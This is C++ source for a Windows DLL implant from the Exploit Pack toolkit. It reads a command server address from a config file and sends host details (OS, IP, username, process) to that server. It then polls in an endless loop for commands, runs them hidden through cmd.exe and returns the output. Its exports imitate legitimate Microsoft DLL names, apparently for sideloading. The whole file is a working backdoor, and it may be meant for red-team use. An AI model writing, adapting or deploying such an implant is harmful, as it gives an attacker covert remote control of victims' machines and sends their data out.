// EP Dll Agent v2 by Juan Sacco <jsacco@exploitpack.com>
// Avoid PDB file names - Linker->Debugging->Generate Debug Info->No
#include "pch.h"
#include "fstream"
#include <lm.h>
#pragma comment(lib, "netapi32.lib") 
#include <vector>
#include <sstream>
#include <thread>
#include <WS2tcpip.h>
#pragma comment(lib,"ws2_32.lib")

#include <codecvt>
#include <comutil.h>

#include <algorithm>
#define GetCurrentDir _getcwd
#include<iostream>

#pragma comment(lib, "comsuppw.lib")

using namespace std;

string agentUN = "jsacco";
HMODULE hMod;
std::wstring PathAndName;
std::wstring OnlyPath;

static std::string Encode(const std::string data) {
	static constexpr char sEncodingTable[] = {
	  'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
	  'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
	  'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
	  'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
	  'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
	  'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
	  'w', 'x', 'y', 'z', '0', '1', '2', '3',
	  '4', '5', '6', '7', '8', '9', '+', '/'
	};

	size_t in_len = data.size();
	size_t out_len = 4 * ((in_len + 2) / 3);
	std::string ret(out_len, '\0');
	size_t i;
	char* p = const_cast<char*>(ret.c_str());

	for (i = 0; i < in_len - 2; i += 3) {
		*p++ = sEncodingTable[(data[i] >> 2) & 0x3F];
		*p++ = sEncodingTable[((data[i] & 0x3) << 4) | ((int)(data[i + 1] & 0xF0) >> 4)];
		*p++ = sEncodingTable[((data[i + 1] & 0xF) << 2) | ((int)(data[i + 2] & 0xC0) >> 6)];
		*p++ = sEncodingTable[data[i + 2] & 0x3F];
	}
	if (i < in_len) {
		*p++ = sEncodingTable[(data[i] >> 2) & 0x3F];
		if (i == (in_len - 1)) {
			*p++ = sEncodingTable[((data[i] & 0x3) << 4)];
			*p++ = '=';
		}
		else {
			*p++ = sEncodingTable[((data[i] & 0x3) << 4) | ((int)(data[i + 1] & 0xF0) >> 4)];
			*p++ = sEncodingTable[((data[i + 1] & 0xF) << 2)];
		}
		*p++ = '=';
	}

	return ret;
}

std::string ProcessIdToName(DWORD processId)
{
	std::string ret;
	HANDLE handle = OpenProcess(
		PROCESS_QUERY_LIMITED_INFORMATION,
		FALSE,
		processId /* This is the PID, you can find one from windows task manager */
	);
	if (handle)
	{
		DWORD buffSize = 1024;
		CHAR buffer[1024];
		if (QueryFullProcessImageNameA(handle, 0, buffer, &buffSize))
		{
			ret = buffer;
		}
		else
		{
			printf("Error GetModuleBaseNameA : %lu", GetLastError());
		}
		CloseHandle(handle);
	}
	else
	{
		printf("Error OpenProcess : %lu", GetLastError());
	}
	return ret;
}

std::string GetProcessUsername(HANDLE* phProcess)
{
	static char sname[300];
	HANDLE tok = 0;
	HANDLE hProcess;
	TOKEN_USER* ptu;
	DWORD nlen, dlen;
	char name[300], dom[300], tubuf[300], * pret = 0;
	int iUse;

	//if phProcess is NULL we get process handle of this
	//process.
	hProcess = phProcess ? *phProcess : GetCurrentProcess();

	//open the processes token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) goto ert;

	//get the SID of the token
	ptu = (TOKEN_USER*)tubuf;
	if (!GetTokenInformation(tok, (TOKEN_INFORMATION_CLASS)1, ptu, 300, &nlen)) goto ert;

	//get the account/domain name of the SID
	dlen = 300;
	nlen = 300;
	if (!LookupAccountSidA(0, ptu->User.Sid, name, &nlen, dom, &dlen, (PSID_NAME_USE)&iUse)) goto ert;


	//copy info to our static buffer
	if (dlen) {
		strcpy_s(sname, dom);
		strcat_s(sname, "");
		strcat_s(sname, name);
	}
	else {
		strcpy_s(sname, name);
	}
	//set our return variable
	pret = sname;

ert:
	if (tok) CloseHandle(tok);
	return name;
}


string getLocalIPAddress() {
	// Init WinSock
		WSADATA wsa_Data;
	int wsa_ReturnCode = WSAStartup(0x101, &wsa_Data);
	string localIP;

	// Get the local hostname
	char szHostName[255];
	gethostname(szHostName, 255);
	struct hostent* host_entry;
	host_entry = gethostbyname(szHostName);
	char* szLocalIP;
	szLocalIP = inet_ntoa(*(struct in_addr*)*host_entry->h_addr_list);
	WSACleanup();

	return localIP = szLocalIP;
}

bool GetWinMajorMinorVersion(DWORD& major, DWORD& minor)
{
	bool bRetCode = false;
	LPBYTE pinfoRawData = 0;
	if (NERR_Success == NetWkstaGetInfo(NULL, 100, &pinfoRawData))
	{
		WKSTA_INFO_100* pworkstationInfo = (WKSTA_INFO_100*)pinfoRawData;
		major = pworkstationInfo->wki100_ver_major;
		minor = pworkstationInfo->wki100_ver_minor;
		::NetApiBufferFree(pinfoRawData);
		bRetCode = true;
	}
	return bRetCode;
}

string GetOSFriendlyName()
{
	std::string     winver;
	OSVERSIONINFOEX osver;
	SYSTEM_INFO     sysInfo;
	typedef void(__stdcall* GETSYSTEMINFO) (LPSYSTEM_INFO);

	__pragma(warning(push))
		__pragma(warning(disable:4996))
		memset(&osver, 0, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	GetVersionEx((LPOSVERSIONINFO)&osver);
	__pragma(warning(pop))
		DWORD major = 0;
	DWORD minor = 0;
	if (GetWinMajorMinorVersion(major, minor))
	{
		osver.dwMajorVersion = major;
		osver.dwMinorVersion = minor;
	}
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2)
	{
		OSVERSIONINFOEXW osvi;
		ULONGLONG cm = 0;
		cm = VerSetConditionMask(cm, VER_MINORVERSION, VER_EQUAL);
		ZeroMemory(&osvi, sizeof(osvi));
		osvi.dwOSVersionInfoSize = sizeof(osvi);
		osvi.dwMinorVersion = 3;
		if (VerifyVersionInfoW(&osvi, VER_MINORVERSION, cm))
		{
			osver.dwMinorVersion = 3;
		}
	}

	GETSYSTEMINFO getSysInfo = (GETSYSTEMINFO)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "GetNativeSystemInfo");
	if (getSysInfo == NULL)  getSysInfo = ::GetSystemInfo;
	getSysInfo(&sysInfo);

	if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows 10 Server";
	if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 10";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012 R2";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8.1";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008 R2";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 7";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows Vista";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION
		&& sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)  winver = "Windows XP x64";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)   winver = "Windows Server 2003";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)   winver = "Windows XP";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)   winver = "Windows 2000";
	if (osver.dwMajorVersion < 5)   winver = "unknown";

	if (osver.wServicePackMajor != 0)
	{
		std::string sp;
		char buf[128] = { 0 };
		sp = " Service Pack ";
		sprintf_s(buf, sizeof(buf), "%hd", osver.wServicePackMajor);
		sp.append(buf);
		winver += sp;
	}

	return winver;
}

string getComputerName()
{
	char* temp = 0;
	std::string computerName;

#if defined(WIN32) || defined(_WIN32) || defined(_WIN64)
	temp = getenv("COMPUTERNAME");
	if (temp != 0) {
		computerName = temp;
		temp = 0;
	}
#endif
	return computerName;
}

int sendCMDExecuted(string host, int port, string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP) {
	// Initialize Dependencies to the Windows Socket.
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		cout << "WSAStartup failed.\n";
		return -1;
	}

	// We first prepare some "hints" for the "getaddrinfo" function
	// to tell it, that we are looking for a IPv4 TCP Connection.
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;          // We are targeting IPv4
	hints.ai_protocol = IPPROTO_TCP;    // We are targeting TCP
	hints.ai_socktype = SOCK_STREAM;    // We are targeting TCP so its SOCK_STREAM

	// Aquiring of the IPv4 address of a host using the newer
	// "getaddrinfo" function which outdated "gethostbyname".
	// It will search for IPv4 addresses using the TCP-Protocol.
	struct addrinfo* targetAdressInfo = NULL;
	PCSTR toPCSTR = host.c_str();
	DWORD getAddrRes = getaddrinfo(toPCSTR, NULL, &hints, &targetAdressInfo);
	if (getAddrRes != 0 || targetAdressInfo == NULL)
	{
		MessageBox(0, L"Could not resolve the Host Name", 0, 0);
		WSACleanup();
		return -1;
	}

	// Create the Socket Address Informations, using IPv4
	// We dont have to take care of sin_zero, it is only used to extend the length of SOCKADDR_IN to the size of SOCKADDR
	SOCKADDR_IN sockAddr;
	sockAddr.sin_addr = ((struct sockaddr_in*)targetAdressInfo->ai_addr)->sin_addr;    // The IPv4 Address from the Address Resolution Result
	sockAddr.sin_family = AF_INET;  // IPv4
	sockAddr.sin_port = htons(port);  // HTTP Port: 8000

	// We have to free the Address-Information from getaddrinfo again
	freeaddrinfo(targetAdressInfo);

	// Creation of a socket for the communication with the Web Server,
	// using IPv4 and the TCP-Protocol
	SOCKET webSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (webSocket == INVALID_SOCKET)
	{
		MessageBox(0, L"Creation of the Socket Failed", 0, 0);
		WSACleanup();
		return -1;
	}

	BOOL bOptVal = TRUE;
	int bOptLen = sizeof(BOOL);
	setsockopt(webSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&bOptVal, bOptLen);

	if (connect(webSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
	{
		MessageBox(0, L"Could not connect", 0, 0);
		closesocket(webSocket);
		WSACleanup();
		return -1;
	}

	string request = CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + ResponseData + "&1&" + AgentUN + "&" + getLocalIPAddress();
	string encoded_request = Encode(request);
	char text[2048];

	// Sending a HTTP-GET-Request to the Server
	string request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";
	const char* httpRequest = request_craft.c_str();

	int sentBytes = send(webSocket, httpRequest, strlen(httpRequest), 0);
	if (sentBytes < strlen(httpRequest) || sentBytes == SOCKET_ERROR)
	{
		MessageBox(0, L"Could not send the request to the Server", 0, 0);
		closesocket(webSocket);
		WSACleanup();
		return -1;
	}

	// Cleaning up Windows Socket Dependencies
	closesocket(webSocket);
	WSACleanup();

	return 0;
}

int sendInitialData(string host, int port, string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP, string processID, string phProcess, string proccesName) {
	// Initialize Dependencies to the Windows Socket.
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		cout << "WSAStartup failed.\n";
		return -1;
	}

	// We first prepare some "hints" for the "getaddrinfo" function
	// to tell it, that we are looking for a IPv4 TCP Connection.
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;          // We are targeting IPv4
	hints.ai_protocol = IPPROTO_TCP;    // We are targeting TCP
	hints.ai_socktype = SOCK_STREAM;    // We are targeting TCP so its SOCK_STREAM

	// Aquiring of the IPv4 address of a host using the newer
	// "getaddrinfo" function which outdated "gethostbyname".
	// It will search for IPv4 addresses using the TCP-Protocol.
	struct addrinfo* targetAdressInfo = NULL;
	PCSTR toPCSTR = host.c_str();
	DWORD getAddrRes = getaddrinfo(toPCSTR, NULL, &hints, &targetAdressInfo);
	if (getAddrRes != 0 || targetAdressInfo == NULL)
	{
		MessageBox(0, L"Could not resolve the Host Name", 0, 0);
		WSACleanup();
		return -1;
	}

	// Create the Socket Address Informations, using IPv4
	// We dont have to take care of sin_zero, it is only used to extend the length of SOCKADDR_IN to the size of SOCKADDR
	SOCKADDR_IN sockAddr;
	sockAddr.sin_addr = ((struct sockaddr_in*)targetAdressInfo->ai_addr)->sin_addr;    // The IPv4 Address from the Address Resolution Result
	sockAddr.sin_family = AF_INET;  // IPv4
	sockAddr.sin_port = htons(port);  // HTTP Port: 8000

	// We have to free the Address-Information from getaddrinfo again
	freeaddrinfo(targetAdressInfo);

	// Creation of a socket for the communication with the Web Server,
	// using IPv4 and the TCP-Protocol
	SOCKET webSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (webSocket == INVALID_SOCKET)
	{
		MessageBox(0, L"Creation of the Socket Failed", 0, 0);
		WSACleanup();
		return -1;
	}

	BOOL bOptVal = TRUE;
	int bOptLen = sizeof(BOOL);
	setsockopt(webSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&bOptVal, bOptLen);

	if (connect(webSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
	{
		MessageBox(0, L"Could not connect", 0, 0);
		closesocket(webSocket);
		WSACleanup();
		return -1;
	}

	string initialData;
	initialData = "\nExploit Pack agent connected.\nOperating system: " + GetOSFriendlyName() + "\n" + "Local IP : " + getLocalIPAddress() + "\n" + "Hiding in process: " + proccesName + "\nPID identifier: " + processID + "\n" + "Privileges: " + GetProcessUsername(NULL) + "\n" + "PPL: None";

	string request = CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + initialData + "&1&" + AgentUN + "&" + getLocalIPAddress();
	string encoded_request = Encode(request);
	char text[2048];

	// Sending a HTTP-GET-Request to the Server
	string request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";
	const char* httpRequest = request_craft.c_str();

	int sentBytes = send(webSocket, httpRequest, strlen(httpRequest), 0);
	if (sentBytes < strlen(httpRequest) || sentBytes == SOCKET_ERROR)
	{
		MessageBox(0, L"Could not send the request to the Server", 0, 0);
		closesocket(webSocket);
		WSACleanup();
		return -1;
	}

	// Cleaning up Windows Socket Dependencies
	closesocket(webSocket);
	WSACleanup();

	return 0;
}

int sendResults(string host, int port, string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP) {
	// Initialize Dependencies to the Windows Socket.
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		cout << "WSAStartup failed.\n";
		return -1;
	}

	// We first prepare some "hints" for the "getaddrinfo" function
	// to tell it, that we are looking for a IPv4 TCP Connection.
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;          // We are targeting IPv4
	hints.ai_protocol = IPPROTO_TCP;    // We are targeting TCP
	hints.ai_socktype = SOCK_STREAM;    // We are targeting TCP so its SOCK_STREAM

	// Aquiring of the IPv4 address of a host using the newer
	// "getaddrinfo" function which outdated "gethostbyname".
	// It will search for IPv4 addresses using the TCP-Protocol.
	struct addrinfo* targetAdressInfo = NULL;
	PCSTR toPCSTR = host.c_str();
	DWORD getAddrRes = getaddrinfo(toPCSTR, NULL, &hints, &targetAdressInfo);
	if (getAddrRes != 0 || targetAdressInfo == NULL)
	{
		MessageBox(0, L"Could not resolve the Host Name", 0, 0);
		WSACleanup();
		return -1;
	}

	// Create the Socket Address Informations, using IPv4
	// We dont have to take care of sin_zero, it is only used to extend the length of SOCKADDR_IN to the size of SOCKADDR
	SOCKADDR_IN sockAddr;
	sockAddr.sin_addr = ((struct sockaddr_in*)targetAdressInfo->ai_addr)->sin_addr;    // The IPv4 Address from the Address Resolution Result
	sockAddr.sin_family = AF_INET;  // IPv4
	sockAddr.sin_port = htons(port);  // HTTP Port: 8000

	// We have to free the Address-Information from getaddrinfo again
	freeaddrinfo(targetAdressInfo);

	// Creation of a socket for the communication with the Web Server,
	// using IPv4 and the TCP-Protocol
	SOCKET webSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (webSocket == INVALID_SOCKET)
	{
		MessageBox(0, L"Creation of the Socket Failed", 0, 0);
		WSACleanup();
		return -1;
	}

	BOOL bOptVal = TRUE;
	int bOptLen = sizeof(BOOL);
	setsockopt(webSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&bOptVal, bOptLen);

	if (connect(webSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
	{
		MessageBox(0, L"Could not connect", 0, 0);
		closesocket(webSocket);
		WSACleanup();
		return -1;
	}

	string request = CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + ResponseData + "&1&" + AgentUN + "&" + getLocalIPAddress();
	string encoded_request = Encode(request);
	char text[2048];

	// Sending a HTTP-GET-Request to the Server
	string request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";
	const char* httpRequest = request_craft.c_str();

	int sentBytes = send(webSocket, httpRequest, strlen(httpRequest), 0);
	if (sentBytes < strlen(httpRequest) || sentBytes == SOCKET_ERROR)
	{
		MessageBox(0, L"Could not send the request to the Server", 0, 0);
		closesocket(webSocket);
		WSACleanup();
		return -1;
	}

	// Cleaning up Windows Socket Dependencies
	closesocket(webSocket);
	WSACleanup();

	return 0;
}


string readFile2(const string& fileName)
{
	ifstream ifs(fileName.c_str(), ios::in | ios::binary | ios::ate);

	ifstream::pos_type fileSize = ifs.tellg();
	ifs.seekg(0, ios::beg);

	vector<char> bytes(fileSize);
	ifs.read(bytes.data(), fileSize);

	ifs.close();
	return string(bytes.data(), fileSize);
}

bool  SendMagic(string host, int port, string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP) {
	// DEBUG
	//MessageBox(0, L"From Magic", 0, 0);
	bool enter = false;

	// Initialize Dependencies to the Windows Socket.
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		cout << "WSAStartup failed.\n";
		return -1;
	}

	// We first prepare some "hints" for the "getaddrinfo" function
	// to tell it, that we are looking for a IPv4 TCP Connection.
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;          // We are targeting IPv4
	hints.ai_protocol = IPPROTO_TCP;    // We are targeting TCP
	hints.ai_socktype = SOCK_STREAM;    // We are targeting TCP so its SOCK_STREAM

	// Aquiring of the IPv4 address of a host using the newer
	// "getaddrinfo" function which outdated "gethostbyname".
	// It will search for IPv4 addresses using the TCP-Protocol.
	struct addrinfo* targetAdressInfo = NULL;
	PCSTR toPCSTR = host.c_str();
	DWORD getAddrRes = getaddrinfo(toPCSTR, NULL, &hints, &targetAdressInfo);
	if (getAddrRes != 0 || targetAdressInfo == NULL)
	{
		MessageBox(0, L"Could not resolve the Host Name", 0, 0);
		WSACleanup();
		return -1;
	}

	// Create the Socket Address Informations, using IPv4
	// We dont have to take care of sin_zero, it is only used to extend the length of SOCKADDR_IN to the size of SOCKADDR
	SOCKADDR_IN sockAddr;
	sockAddr.sin_addr = ((struct sockaddr_in*)targetAdressInfo->ai_addr)->sin_addr;    // The IPv4 Address from the Address Resolution Result
	sockAddr.sin_family = AF_INET;  // IPv4
	sockAddr.sin_port = htons(port);  // HTTP Port: 8000

	// We have to free the Address-Information from getaddrinfo again
	freeaddrinfo(targetAdressInfo);

	// Creation of a socket for the communication with the Web Server,
	// using IPv4 and the TCP-Protocol
	SOCKET webSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (webSocket == INVALID_SOCKET)
	{
		MessageBox(0, L"Creation of the Socket Failed", 0, 0);
		WSACleanup();
		return -1;
	}


	BOOL bOptVal = TRUE;
	int bOptLen = sizeof(BOOL);


	setsockopt(webSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&bOptVal, bOptLen);

	// Establishing a connection to the web Socket
	// DEBUG
	//MessageBox(0, L"Connecting...\n", 0, 0);

	if (connect(webSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
	{
		//   MessageBox(0, L"Could not connect", 0, 0);
		closesocket(webSocket);
		WSACleanup();
		return -1;
	}
	// DEBUG
	//MessageBox(0, L"Connected.\n", 0, 0);

	string request = CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + ResponseData + "&1&" + AgentUN + "&" + getLocalIPAddress();
	string encoded_request = Encode(request);

	//// DEBUG
	//char text[2048];
	//strncpy(text, encoded_request.c_str(), sizeof(text));
	//text[sizeof(text) - 1] = 0;
	//wchar_t wtext[20];
	//mbstowcs(wtext, text, strlen(text) + 1);//Plus null
	//LPWSTR ptr = wtext;
	//MessageBox(0, ptr, 0, 0);

	// Sending a HTTP-GET-Request to the Server
	string request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";
	const char* httpRequest = request_craft.c_str();

	int sentBytes = send(webSocket, httpRequest, strlen(httpRequest), 0);
	if (sentBytes < strlen(httpRequest) || sentBytes == SOCKET_ERROR)
	{
		MessageBox(0, L"Could not send the request to the Server", 0, 0);
		closesocket(webSocket);
		WSACleanup();
		return -1;
	}

	// Receiving and Displaying an answer from the Server
	char bufferRCV[4096];
	int dataLen;


	ZeroMemory(bufferRCV, sizeof(bufferRCV));
	memset(bufferRCV, 0, sizeof(bufferRCV));
	while ((dataLen = recv(webSocket, bufferRCV, sizeof(bufferRCV), 0) > 0))
	{
		string response = " ";
		char* content = strstr(bufferRCV, " OS=");
		if (content != NULL) {
			content += 0; // Offset by 4 bytes to start of content
		}
		else {
			content = bufferRCV; // Didn't find end of header, write out everything
			int i = 0;

			while (content[i] >= 32 || content[i] == '\r') {

				//string pattern1 = "HTTP/1.1";
				//removeSubstrs(response, pattern1);
				response += content[i];
				i += 1;
			}
		}

		this_thread::sleep_for(chrono::milliseconds(1000));

		string filtertring("OS=");
		if ((response.find(filtertring) != string::npos)) {
			vector<string> strings;
			istringstream f(response);

			string filter_cmd = response;
			string filter_string("OS=");

			if ((filter_cmd.find(filter_string) != string::npos)) {
				bool enter = true;
				std::string clean_CMD1 = "OS=";

				for (char c : clean_CMD1) {
					filter_cmd.erase(std::remove(filter_cmd.begin(), filter_cmd.end(), c), filter_cmd.end());
				}

				// Remove delimiter
				std::string delimiter = "*_*";
				std::string token = filter_cmd.substr(0, filter_cmd.find(delimiter));
				filter_cmd = token; 

				// DEBUG
				//char text[2048];
				//strncpy(text, token.c_str(), sizeof(text));
				//text[sizeof(text) - 1] = 0;
				//wchar_t wtext[20];
				//mbstowcs(wtext, text, strlen(text) + 1);//Plus null
				//LPWSTR ptr = wtext;
				//MessageBox(0, ptr, 0, 0);


			

				if (filter_cmd.length() > 2) {
					ifstream infile("c:\\windows\\temp\\temp.log");
					if (!infile.good())
					{
						std::string input = "";
						std::ofstream outfile("c:\\windows\\temp\\temp.log");
						outfile << input << std::endl;
						outfile.close();
					}

					// Debug command received
					char textcmd[2048];
					strncpy(textcmd, filter_cmd.c_str(), sizeof(textcmd));
					textcmd[sizeof(textcmd) - 1] = 0;
					wchar_t wtext[20];
					mbstowcs(wtext, textcmd, strlen(textcmd) + 1);//plus null
					LPWSTR ptr = wtext;

					std::string str = "/C " + filter_cmd + " > c:\\windows\\temp\\temp.log 2>&1";
					BSTR b = _com_util::ConvertStringToBSTR(str.c_str());
					LPWSTR cmd = b;

					STARTUPINFO si;
					PROCESS_INFORMATION pi;
					LPVOID allocation_start;

					HANDLE hThread;
					NTSTATUS status;

					ZeroMemory(&si, sizeof(si));
					ZeroMemory(&pi, sizeof(pi));
					si.cb = sizeof(si);
					LPCWSTR cmdRun = TEXT("C:\\Windows\\System32\\cmd.exe");

					if (!CreateProcess(
						cmdRun,							// Executable
						cmd,							// Command line
						NULL,							// Process handle not inheritable
						NULL,							// Thread handle not inheritable
						FALSE,							// Set handle inheritance to FALSE
						CREATE_NO_WINDOW,	            // Do Not Open a Window
						NULL,							// Use parent's environment block
						NULL,							// Use parent's starting directory 
						&si,			                // Pointer to STARTUPINFO structure
						&pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
					)) {
						DWORD errval = GetLastError();
						std::ostringstream stream;
						int i = 5;
						stream << i;
						std::string str = stream.str();

						char textcmd1[2048];
						strncpy(textcmd1, str.c_str(), sizeof(textcmd1));
						textcmd1[sizeof(textcmd1) - 1] = 0;
						wchar_t wtext1[20];
						mbstowcs(wtext1, textcmd1, strlen(textcmd1) + 1);//plus null
						LPWSTR ptr = wtext1;
						MessageBox(0, (L"Execution failed: %s\n", ptr), 0, 0);
					}
					SysFreeString(b);
					// Give time for the cmd to finish
					this_thread::sleep_for(chrono::milliseconds(2000));

					if (infile.good())
					{
						this_thread::sleep_for(chrono::milliseconds(2000));
						sendCMDExecuted(host, port, getComputerName(), getLocalIPAddress(), "Explorer Object + DLL", GetOSFriendlyName(), "Command executed", agentUN, getLocalIPAddress());
						this_thread::sleep_for(chrono::milliseconds(2000));
						sendResults(host, port, getComputerName(), getLocalIPAddress(), "Explorer Object + DLL", GetOSFriendlyName(), readFile2("c:\\windows\\temp\\temp.log"), agentUN, getLocalIPAddress());
						closesocket(webSocket);
						WSACleanup();
					}
				}
			}
			else {
				this_thread::sleep_for(chrono::milliseconds(2000));
				SendMagic(host, port, getComputerName(), getLocalIPAddress(), "Explorer Object + DLL", GetOSFriendlyName(), "Waiting for Exploit Pack..", agentUN, getLocalIPAddress());
				closesocket(webSocket);
				WSACleanup();
			}
		}
	}

	// Cleaning up Windows Socket Dependencies
	closesocket(webSocket);
	WSACleanup();

	return enter;
}

int isIp_v4(char* ip) {
	int num;
	int flag = 1;
	int counter = 0;
	char* p = strtok(ip, ".");

	while (p && flag) {
		num = atoi(p);

		if (num >= 0 && num <= 255 && (counter++ < 4)) {
			flag = 1;
			p = strtok(NULL, ".");

		}
		else {
			flag = 0;
			break;
		}
	}

	return flag & (counter == 4);

}


int DumpFile(HMODULE hModule)
{
	const int BUFSIZE = 4096;
	wchar_t buffer[BUFSIZE];
	if (::GetModuleFileNameW(hModule, buffer, BUFSIZE - 1) <= 0)
	{
		return TRUE;
	}

	PathAndName = buffer;

	size_t found = PathAndName.find_last_of(L"/\\");
	OnlyPath = PathAndName.substr(0, found);

	//setup converter
	using convert_type = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_type, wchar_t> converter;

	//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
	std::string path_converter = converter.to_bytes(OnlyPath);
	//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
	std::string path_and_name_converter = converter.to_bytes(PathAndName);

	uint32_t pid = GetCurrentProcessId();
	std::ofstream myfile;
	std::string filename;
	std::string path = "c:\\windows\\tasks\\";
	std::string file_ext = ".txt";
	filename = path + std::to_string(pid) + file_ext;
	myfile.open(filename);
	myfile << "Process: " + ProcessIdToName(pid) + "\n";
	myfile << "PID: " + std::to_string(pid) + "\n";
	myfile << "Injected from ADVCD-DLL: " + GetProcessUsername(NULL) + "\n";\
	//myfile << "DLL Path: " + path_converter + "\n";
	myfile << "DLL Path: " + path_and_name_converter + "\n";

	myfile << "###########################################################################################################\n";
	myfile.close();

	const char x = '\\';
	const char y = '\\\\';

	std::replace(path_converter.begin(), path_converter.end(), x, y);

	std::ifstream input(path_converter+"\\config.ep");
	string ip_server = "";
	string port_server = "";
	for (std::string line; getline(input, line); )
	{
		if (isIp_v4(_strdup(line.c_str()))) {
			ip_server = line.c_str();
		}
		else {
			port_server = line.c_str();
		}
	}

	sendInitialData(ip_server, stoi(port_server), getComputerName(), getLocalIPAddress(), "Explorer Object + DLL", GetOSFriendlyName(), "None", agentUN, getLocalIPAddress(), std::to_string(pid), ProcessIdToName(pid), ProcessIdToName(pid));
	while (true) {
		this_thread::sleep_for(chrono::milliseconds(2000));
		SendMagic(ip_server, stoi(port_server), getComputerName(), getLocalIPAddress(), "Explorer Object + DLL", GetOSFriendlyName(), "Waiting for Exploit Pack..", agentUN, getLocalIPAddress());
		SendMagic(ip_server, stoi(port_server), getComputerName(), getLocalIPAddress(), "Explorer Object + DLL", GetOSFriendlyName(), "Waiting for Exploit Pack..", agentUN, getLocalIPAddress());
	}

	return true;
}

extern "C" __declspec(dllexport) auto InitializeManagedCode() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto ReleaseWmiEventManager() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto EtwTraceAspNetUnregister() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto MonitorGlobalConfigFile() {
	DumpFile(hMod);
	return true;
}

extern "C" __declspec(dllexport) auto IsManagedDebuggerConnectedIndirect() {
	DumpFile(hMod);
	return true;
}

